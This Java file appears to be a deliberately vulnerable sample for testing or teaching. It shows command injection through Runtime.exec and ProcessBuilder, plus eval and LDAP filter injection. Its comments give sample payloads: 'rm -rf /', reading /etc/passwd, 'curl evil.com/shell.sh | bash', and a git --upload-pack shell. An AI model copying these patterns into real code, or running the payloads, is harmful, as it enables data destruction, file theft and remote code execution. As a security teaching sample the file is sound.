package com.example.vulnerable;

import java.io.*;

/**
 * VULNERABLE CODE - Command Injection
 * DO NOT USE IN PRODUCTION!
 */
public class CommandInjection {
    
    // CRITICAL: Direct command execution
    public void pingHost(String hostname) throws Exception {
        Runtime.getRuntime().exec("ping -c 4 " + hostname);
        // Attacker can inject: 8.8.8.8; rm -rf /
    }
    
    // CRITICAL: Shell command with user input
    public void convertImage(String filename) throws Exception {
        String command = "convert /uploads/" + filename + " /output/result.png";
        Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
        // Vulnerable to: image.jpg && cat /etc/passwd
    }
    
    // HIGH: ProcessBuilder with concatenation
    public void executeScript(String scriptName) throws Exception {
        ProcessBuilder pb = new ProcessBuilder("bash", "-c", "./scripts/" + scriptName);
        pb.start();
        // Can execute: script.sh; curl evil.com/shell.sh | bash
    }
    
    // CRITICAL: System property injection
    public void backupDatabase(String dbName) throws Exception {
        String cmd = "mysqldump -u root " + dbName + " > backup.sql";
        Process p = Runtime.getRuntime().exec(cmd);
    }
    
    // HIGH: Git command injection
    public void cloneRepo(String repoUrl) throws Exception {
        Runtime.getRuntime().exec("git clone " + repoUrl);
        // Inject: http://evil.com/repo.git --upload-pack='exec /bin/sh'
    }
    
    // CRITICAL: Eval-like behavior with scripting
    public void executeUserCode(String code) throws Exception {
        javax.script.ScriptEngineManager manager = new javax.script.ScriptEngineManager();
        javax.script.ScriptEngine engine = manager.getEngineByName("javascript");
        engine.eval(code); // Can execute arbitrary JavaScript
    }
    
    // HIGH: LDAP injection
    public void ldapSearch(String username) {
        String filter = "(uid=" + username + ")";
        // Attacker can inject: *)(uid=*))(|(uid=*
    }
}
